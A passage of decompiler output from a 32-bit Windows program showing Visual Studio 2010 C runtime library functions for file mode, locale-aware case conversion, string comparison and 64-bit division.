  int iVar1;
  HANDLE pvVar2;
  LPVOID _Buf;
  int *piVar3;
  int iVar4;
  uint uVar5;
  ulong *puVar6;
  BOOL BVar7;
  uint uVar8;
  int unaff_EDI;
  int iVar9;
  bool bVar10;
  bool bVar11;
  ulonglong uVar12;
  longlong lVar13;
  uint in_stack_00000008;
  DWORD DVar14;
  SIZE_T dwBytes;
  uint local_14;
  uint local_10;
  
  local_14 = 0;
  local_10 = 0;
  uVar12 = __lseeki64_nolock(_FileHandle,0x100000000,unaff_EDI);
  if (uVar12 == 0xffffffffffffffff) goto LAB_00410e86;
  lVar13 = __lseeki64_nolock(_FileHandle,0x200000000,unaff_EDI);
  iVar4 = (int)((ulonglong)lVar13 >> 0x20);
  if (lVar13 == -1) goto LAB_00410e86;
  uVar8 = in_stack_00000008 - (uint)lVar13;
  uVar5 = (uint)(in_stack_00000008 < (uint)lVar13);
  iVar1 = (int)_Size - iVar4;
  iVar9 = iVar1 - uVar5;
  if ((iVar9 < 0) ||
     ((iVar9 == 0 || (SBORROW4((int)_Size,iVar4) != SBORROW4(iVar1,uVar5)) != iVar9 < 0 &&
      (uVar8 == 0)))) {
    if ((iVar9 < 1) && (iVar9 < 0)) {
      lVar13 = __lseeki64_nolock(_FileHandle,_Size & 0xffffffff,unaff_EDI);
      if (lVar13 == -1) goto LAB_00410e86;
      pvVar2 = (HANDLE)__get_osfhandle(_FileHandle);
      BVar7 = SetEndOfFile(pvVar2);
      local_14 = (BVar7 != 0) - 1;
      local_10 = (int)local_14 >> 0x1f;
      if ((local_14 & local_10) == 0xffffffff) {
        piVar3 = __errno();
        *piVar3 = 0xd;
        puVar6 = ___doserrno();
        DVar14 = GetLastError();
        *puVar6 = DVar14;
        goto LAB_00410f84;
      }
    }
  }
  else {
    dwBytes = 0x1000;
    DVar14 = 8;
    pvVar2 = GetProcessHeap();
    _Buf = HeapAlloc(pvVar2,DVar14,dwBytes);
    if (_Buf == (LPVOID)0x0) {
      piVar3 = __errno();
      *piVar3 = 0xc;
      goto LAB_00410e86;
    }
    iVar4 = __setmode_nolock(_FileHandle,0x8000);
    while( true ) {
      uVar5 = uVar8;
      if ((-1 < iVar9) && ((0 < iVar9 || (0xfff < uVar8)))) {
        uVar5 = 0x1000;
      }
      uVar5 = __write_nolock(_FileHandle,_Buf,uVar5);
      if (uVar5 == 0xffffffff) break;
      bVar10 = uVar8 < uVar5;
      uVar8 = uVar8 - uVar5;
      bVar11 = SBORROW4(iVar9,(int)uVar5 >> 0x1f);
      iVar1 = iVar9 - ((int)uVar5 >> 0x1f);
      iVar9 = iVar1 - (uint)bVar10;
      if ((iVar9 < 0) ||
         ((iVar9 == 0 || (bVar11 != SBORROW4(iVar1,(uint)bVar10)) != iVar9 < 0 && (uVar8 == 0))))
      goto LAB_00410ed8;
    }
    puVar6 = ___doserrno();
    if (*puVar6 == 5) {
      piVar3 = __errno();
      *piVar3 = 0xd;
    }
    local_14 = 0xffffffff;
    local_10 = 0xffffffff;
LAB_00410ed8:
    __setmode_nolock(_FileHandle,iVar4);
    DVar14 = 0;
    pvVar2 = GetProcessHeap();
    HeapFree(pvVar2,DVar14,_Buf);
LAB_00410f84:
    if ((local_14 & local_10) == 0xffffffff) goto LAB_00410e86;
  }
  lVar13 = __lseeki64_nolock(_FileHandle,uVar12 >> 0x20,unaff_EDI);
  if (lVar13 != -1) {
    return 0;
  }
LAB_00410e86:
  piVar3 = __errno();
  return *piVar3;
}



// Library Function - Single Match
//  __setmode_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __setmode_nolock(int _FileHandle,int _Mode)

{
  int *piVar1;
  char cVar2;
  byte bVar3;
  int iVar4;
  byte *pbVar5;
  byte bVar6;
  int iVar7;
  
  piVar1 = &DAT_00418ea0 + (_FileHandle >> 5);
  iVar7 = (_FileHandle & 0x1fU) * 0x40;
  iVar4 = *piVar1 + iVar7;
  cVar2 = *(char *)(iVar4 + 0x24);
  bVar3 = *(byte *)(iVar4 + 4);
  if (_Mode == 0x4000) {
    *(byte *)(iVar4 + 4) = *(byte *)(iVar4 + 4) | 0x80;
    pbVar5 = (byte *)(*piVar1 + 0x24 + iVar7);
    *pbVar5 = *pbVar5 & 0x80;
  }
  else if (_Mode == 0x8000) {
    *(byte *)(iVar4 + 4) = *(byte *)(iVar4 + 4) & 0x7f;
  }
  else {
    if ((_Mode == 0x10000) || (_Mode == 0x20000)) {
      *(byte *)(iVar4 + 4) = *(byte *)(iVar4 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar1 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x82 | 2;
    }
    else {
      if (_Mode != 0x40000) goto LAB_00411051;
      *(byte *)(iVar4 + 4) = *(byte *)(iVar4 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar1 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x81 | 1;
    }
    *pbVar5 = bVar6;
  }
LAB_00411051:
  if ((bVar3 & 0x80) == 0) {
    return 0x8000;
  }
  return (-(uint)((char)(cVar2 * '\x02') >> 1 != '\0') & 0xc000) + 0x4000;
}



// Library Function - Single Match
//  __get_fmode
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl __get_fmode(int *_PMode)

{
  int *piVar1;
  
  if (_PMode == (int *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
    return 0x16;
  }
  *_PMode = DAT_00417d14;
  return 0;
}



// Library Function - Single Match
//  __towlower_l
// 
// Library: Visual Studio 2010 Release

wint_t __cdecl __towlower_l(wint_t _C,_locale_t _Locale)

{
  WCHAR WVar1;
  int iVar2;
  undefined2 in_stack_00000006;
  int local_18 [2];
  int local_10;
  char local_c;
  WCHAR local_8 [2];
  
  WVar1 = L'\xffff';
  if (_C != 0xffff) {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_18,_Locale);
    if (*(LPCWSTR *)(local_18[0] + 0x14) == (LPCWSTR)0x0) {
      WVar1 = _C;
      if ((ushort)(_C - 0x41) < 0x1a) {
        WVar1 = _C + L' ';
      }
    }
    else if (_C < 0x100) {
      iVar2 = _iswctype(_C,1);
      WVar1 = _C;
      if (iVar2 != 0) {
        WVar1 = (ushort)*(byte *)(*(int *)(local_18[0] + 0xcc) + (__C & 0xffff));
      }
    }
    else {
      iVar2 = ___crtLCMapStringW(*(LPCWSTR *)(local_18[0] + 0x14),0x100,(LPCWSTR)&_C,1,local_8,1);
      WVar1 = _C;
      if (iVar2 != 0) {
        WVar1 = local_8[0];
      }
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
  }
  return WVar1;
}



// Library Function - Single Match
//  ___initconout
// 
// Library: Visual Studio 2010 Release

void __cdecl ___initconout(void)

{
  DAT_00416f00 = CreateFileW(u_CONOUT__00413b48,0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                             (HANDLE)0x0);
  return;
}



// Library Function - Single Match
//  _abort
// 
// Library: Visual Studio 2010 Release

void __cdecl _abort(void)

{
  code *pcVar1;
  int iVar2;
  
  iVar2 = FUN_0040ef0d();
  if (iVar2 != 0) {
    _raise(0x16);
  }
  if ((DAT_00416f04 & 2) != 0) {
    __call_reportfault(3,0x40000015,1);
  }
  __exit(3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __strnicmp_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __strnicmp_l(char *_Str1,char *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if (_MaxCount == 0) {
    iVar2 = 0;
  }
  else {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
    if ((_Str1 == (char *)0x0) || (_Str2 == (char *)0x0)) {
      piVar1 = __errno();
      *piVar1 = 0x16;
      FUN_004071df();
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      iVar2 = 0x7fffffff;
    }
    else if (_MaxCount < 0x80000000) {
      if ((local_14.locinfo)->lc_category[0].wlocale == (wchar_t *)0x0) {
        iVar2 = ___ascii_strnicmp(_Str1,_Str2,_MaxCount);
      }
      else {
        iVar4 = (int)_Str1 - (int)_Str2;
        do {
          iVar2 = __tolower_l((uint)((byte *)_Str2)[iVar4],&local_14);
          iVar3 = __tolower_l((uint)(byte)*_Str2,&local_14);
          _Str2 = (char *)((byte *)_Str2 + 1);
          _MaxCount = _MaxCount - 1;
          if ((_MaxCount == 0) || (iVar2 == 0)) break;
        } while (iVar2 == iVar3);
        iVar2 = iVar2 - iVar3;
      }
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
    }
    else {
      piVar1 = __errno();
      *piVar1 = 0x16;
      FUN_004071df();
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      iVar2 = 0x7fffffff;
    }
  }
  return iVar2;
}



// Library Function - Single Match
//  __strnicmp
// 
// Library: Visual Studio 2010 Release

int __cdecl __strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  int *piVar1;
  int iVar2;
  
  if (DAT_00417b2c != 0) {
    iVar2 = __strnicmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
    return iVar2;
  }
  if (((_Str1 != (char *)0x0) && (_Str2 != (char *)0x0)) && (_MaxCount < 0x80000000)) {
    iVar2 = ___ascii_strnicmp(_Str1,_Str2,_MaxCount);
    return iVar2;
  }
  piVar1 = __errno();
  *piVar1 = 0x16;
  FUN_004071df();
  return 0x7fffffff;
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_16
// 
// Library: Visual Studio 2010 Release

uint __alloca_probe_16(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 0xf;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_8
// 
// Library: Visual Studio

uint __alloca_probe_8(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 7;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// Library Function - Single Match
//  __isctype_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __isctype_l(int _C,int _Type,_locale_t _Locale)

{
  int iVar1;
  BOOL BVar2;
  CHAR CVar3;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  CHAR local_c;
  CHAR local_b;
  undefined local_a;
  ushort local_8 [2];
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if (_C + 1U < 0x101) {
    local_8[0] = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2);
  }
  else {
    iVar1 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c);
    CVar3 = (CHAR)_C;
    if (iVar1 == 0) {
      local_b = '\0';
      iVar1 = 1;
      local_c = CVar3;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_c = (CHAR)_C;
      local_a = 0;
      iVar1 = 2;
      local_b = CVar3;
    }
    BVar2 = ___crtGetStringTypeA
                      (&local_1c,1,&local_c,iVar1,local_8,(local_1c.locinfo)->lc_codepage,
                       (BOOL)(local_1c.locinfo)->lc_category[0].wlocale);
    if (BVar2 == 0) {
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
      return 0;
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return (uint)local_8[0] & _Type;
}



// Library Function - Single Match
//  ___crtLCMapStringW
// 
// Library: Visual Studio 2010 Release

int __cdecl
___crtLCMapStringW(LPCWSTR _LocaleName,DWORD _DWMapFlag,LPCWSTR _LpSrcStr,int _CchSrc,
                  LPWSTR _LpDestStr,int _CchDest)

{
  int iVar1;
  
  if (0 < _CchSrc) {
    _CchSrc = _wcsnlen(_LpSrcStr,_CchSrc);
  }
  iVar1 = LCMapStringW((LCID)_LocaleName,_DWMapFlag,_LpSrcStr,_CchSrc,_LpDestStr,_CchDest);
  return iVar1;
}



// Library Function - Single Match
//  __tolower_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __tolower_l(int _C,_locale_t _Locale)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  CHAR CVar5;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  byte local_c;
  undefined local_b;
  CHAR local_8;
  CHAR local_7;
  undefined local_6;
  
  iVar1 = _C;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if ((uint)_C < 0x100) {
    if ((int)(local_1c.locinfo)->locale_name[3] < 2) {
      uVar2 = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2) & 1;
    }
    else {
      uVar2 = __isctype_l(_C,1,&local_1c);
    }
    if (uVar2 == 0) {
LAB_00411454:
      if (local_10 == '\0') {
        return iVar1;
      }
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      return iVar1;
    }
    uVar2 = (uint)*(byte *)((int)local_1c.locinfo[1].lc_category[0].wlocale + _C);
  }
  else {
    CVar5 = (CHAR)_C;
    if (((int)(local_1c.locinfo)->locale_name[3] < 2) ||
       (iVar3 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c), iVar3 == 0)) {
      piVar4 = __errno();
      *piVar4 = 0x2a;
      local_7 = '\0';
      iVar3 = 1;
      local_8 = CVar5;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_8 = (CHAR)_C;
      local_6 = 0;
      iVar3 = 2;
      local_7 = CVar5;
    }
    iVar3 = ___crtLCMapStringA(&local_1c,(local_1c.locinfo)->lc_category[0].wlocale,0x100,&local_8,
                               iVar3,(LPSTR)&local_c,3,(local_1c.locinfo)->lc_codepage,1);
    if (iVar3 == 0) goto LAB_00411454;
    uVar2 = (uint)local_c;
    if (iVar3 != 1) {
      uVar2 = (uint)CONCAT11(local_c,local_b);
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return uVar2;
}



// Library Function - Single Match
//  ___ascii_strnicmp
// 
// Library: Visual Studio 2010 Release

int __cdecl ___ascii_strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  char cVar1;
  byte bVar2;
  ushort uVar3;
  uint uVar4;
  bool bVar5;
  
  if (_MaxCount != 0) {
    do {
      bVar2 = *_Str1;
      cVar1 = *_Str2;
      uVar3 = CONCAT11(bVar2,cVar1);
      if (bVar2 == 0) break;
      uVar3 = CONCAT11(bVar2,cVar1);
      uVar4 = (uint)uVar3;
      if (cVar1 == '\0') break;
      _Str1 = (char *)((byte *)_Str1 + 1);
      _Str2 = _Str2 + 1;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar4 = (uint)CONCAT11(bVar2 + 0x20,cVar1);
      }
      uVar3 = (ushort)uVar4;
      bVar2 = (byte)uVar4;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar3 = (ushort)CONCAT31((int3)(uVar4 >> 8),bVar2 + 0x20);
      }
      bVar2 = (byte)(uVar3 >> 8);
      bVar5 = bVar2 < (byte)uVar3;
      if (bVar2 != (byte)uVar3) goto LAB_00411561;
      _MaxCount = _MaxCount - 1;
    } while (_MaxCount != 0);
    _MaxCount = 0;
    bVar2 = (byte)(uVar3 >> 8);
    bVar5 = bVar2 < (byte)uVar3;
    if (bVar2 != (byte)uVar3) {
LAB_00411561:
      _MaxCount = 0xffffffff;
      if (!bVar5) {
        _MaxCount = 1;
      }
    }
  }
  return _MaxCount;
}



// Library Function - Single Match
//  _wcsnlen
// 
// Library: Visual Studio 2010 Release

size_t __cdecl _wcsnlen(wchar_t *_Src,size_t _MaxCount)

{
  uint uVar1;
  
  uVar1 = 0;
  if (_MaxCount != 0) {
    do {
      if (*_Src == L'\0') {
        return uVar1;
      }
      uVar1 = uVar1 + 1;
      _Src = _Src + 1;
    } while (uVar1 < _MaxCount);
  }
  return uVar1;
}



void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x00411592. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}



// Library Function - Single Match
//  __alldiv
// 
// Library: Visual Studio

undefined8 __alldiv(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}


